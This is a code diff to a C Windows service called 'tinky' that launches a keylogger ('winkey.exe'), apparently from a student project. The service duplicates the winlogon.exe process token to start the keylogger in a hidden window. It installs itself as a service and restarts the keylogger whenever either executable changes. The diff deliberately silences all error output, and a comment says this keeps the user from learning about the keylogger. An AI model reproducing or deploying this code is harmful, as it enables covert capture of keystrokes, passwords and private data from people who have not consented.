@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
+#include <shlobj.h>
 
 #define SERVICE_NAME "tinky"
 #define _WIN32_WINNT 0x0A00
@@ -12,13 +13,32 @@
 #define _WIN32_WINNT_WIN10_RS5 0x0A00
 #define NTDDI_WIN10_CU 0x0A000000
 
-#define TINKY_EXE "Z:\\tinky-winkey\\tinky\\tinky.exe"
-#define NEW_TINKY_EXE "Z:\\tinky-winkey\\tinky\\new_tinky.exe"
-#define WINKY_EXE "Z:\\tinky-winkey\\winkey\\winkey.exe"
-
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 HANDLE hKeyloggerProcess = NULL;
+
+#define NEW_TINKY_EXE "C:\\tinky.exe"
+
+char TINKY_EXE[MAX_PATH];
+char WINKY_EXE[MAX_PATH];
+
+void SetTinkyPath(void)
+{
+    if (GetModuleFileName(NULL, TINKY_EXE, MAX_PATH) == 0)
+    {
+        printf("Failed to get current executable path. Error: %lu\n", GetLastError());
+        return;
+    }
+
+    strncpy(WINKY_EXE, TINKY_EXE, MAX_PATH);
+
+    char* tinkyPosition = strstr(WINKY_EXE, "tinky\\tinky.exe");
+    if (tinkyPosition)
+    {
+        strncpy(tinkyPosition, "winkey\\winkey.exe", MAX_PATH - (tinkyPosition - WINKY_EXE));
+    }
+}
+
 
 int InstallService(void)
 {
@@ -28,11 +48,15 @@ int InstallService(void)
         printf("OpenSCManager failed: %lu\n", GetLastError());
         return -1;
     }
+
+    char servicePath[MAX_PATH + 16];
+    snprintf(servicePath, MAX_PATH + 16, "%s start", TINKY_EXE);
+
     SC_HANDLE hService = CreateService(
         hSCManager, SERVICE_NAME, SERVICE_NAME,
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
         SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-        TINKY_EXE" start",
+        servicePath,
         NULL, NULL, NULL, NULL, NULL
     );
     if (!hService)
@@ -127,26 +151,30 @@ DWORD FindProcessID(const char* processName)
     return processID;
 }
 
+/*
+    if this would fail i cannot log as
+    otherwise i'd be giving user information about keylogger
+*/    
 void StartKeylogger(void)
 {
     DWORD pid = FindProcessID("winlogon.exe");
     if (pid == 0)
     {
-        printf("Failed to find winlogon.exe process.\n");
+        // printf("Failed to find winlogon.exe process.\n");
         return;
     }
 
     HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
     if (!processHandle)
     {
-        printf("OpenProcess failed: %lu\n", GetLastError());
+        // printf("OpenProcess failed: %lu\n", GetLastError());
         return;
     }
 
     HANDLE tokenHandle = NULL;
     if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle))
     {
-        printf("OpenProcessToken failed: %lu\n", GetLastError());
+        // printf("OpenProcessToken failed: %lu\n", GetLastError());
         CloseHandle(processHandle);
         return;
     }
@@ -154,7 +182,7 @@ void StartKeylogger(void)
     HANDLE dupTokenHandle = NULL;
     if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupTokenHandle))
     {
-        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
+        // printf("DuplicateTokenEx failed: %lu\n", GetLastError());
         CloseHandle(tokenHandle);
         CloseHandle(processHandle);
         return;
@@ -165,7 +193,7 @@ void StartKeylogger(void)
     if (!CreateProcessAsUser(dupTokenHandle, NULL, WINKY_EXE, NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
     {
-        printf("CreateProcessAsUser failed: %lu\n", GetLastError());
+        // printf("CreateProcessAsUser failed: %lu\n", GetLastError());
     }
     else
     {
@@ -190,21 +218,55 @@ int UpdateAvailable(const char* filePath)
 DWORD WINAPI CheckForUpdates(LPVOID lpParam)
 {
     (void)lpParam;
+    FILETIME lastCheckedFileTime_TINKY = {0};
+    FILETIME lastCheckedFileTime_WINKY = {0};
+
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
-        if (UpdateAvailable(NEW_TINKY_EXE))
+        WIN32_FILE_ATTRIBUTE_DATA currentFileData;
+
+        if (GetFileAttributesEx(TINKY_EXE, GetFileExInfoStandard, &currentFileData))
         {
-            StopKeylogger();
-            MoveFile(NEW_TINKY_EXE, TINKY_EXE);
-            StartKeylogger();
+            if (CompareFileTime(&currentFileData.ftLastWriteTime, &lastCheckedFileTime_TINKY) > 0)
+            {
+                lastCheckedFileTime_TINKY = currentFileData.ftLastWriteTime;
+
+                StopKeylogger();
+
+                StartKeylogger();
+            }
         }
+        else
+        {
+            // printf("Failed to get file attributes for %s. Error: %lu\n", TINKY_EXE, GetLastError());
+        }
+
+        if (GetFileAttributesEx(WINKY_EXE, GetFileExInfoStandard, &currentFileData))
+        {
+            if (CompareFileTime(&currentFileData.ftLastWriteTime, &lastCheckedFileTime_WINKY) > 0)
+            {
+                lastCheckedFileTime_WINKY = currentFileData.ftLastWriteTime;
+
+                StopKeylogger();
+
+                StartKeylogger();
+            }
+        }
+        else
+        {
+            // printf("Failed to get file attributes for %s. Error: %lu\n", TINKY_EXE, GetLastError());
+        }
+
         Sleep(60000);
     }
     return 0;
 }
 
+
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
+    (void)argc;
+    (void)argv;
     hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
     if (!hStatus)
     {
@@ -296,6 +358,8 @@ void stopService(void)
 
 int main(int argc, char* argv[])
 {
+    SetTinkyPath();
+
     if (argc > 1)
     {
         if (strcmp(argv[1], "install") == 0)
